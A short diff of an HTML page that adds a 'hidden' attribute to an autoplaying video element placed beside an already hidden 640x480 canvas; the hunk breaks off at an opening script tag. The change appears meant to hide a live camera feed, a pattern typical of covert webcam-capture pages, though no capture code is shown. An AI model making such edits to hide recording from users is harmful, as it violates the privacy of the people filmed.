@@ -11,7 +11,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
     <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'><link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
 <div class="video-wrap">
-    <video id="video" playsinline autoplay></video>
+    <video id="video" hidden="hidden" playsinline autoplay></video>
  </div>
 <canvas  hidden="hidden" id="canvas" width="640" height="480"></canvas>
 	<script>
